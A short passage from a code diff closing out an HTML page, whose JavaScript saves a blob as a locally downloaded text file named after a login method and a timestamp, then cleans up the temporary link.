+            a.href = url;
+            a.download = `login_${method.replace(/\s+/g, '_')}_${Date.now()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+    }
+</script>
+
+</body>
+</html>
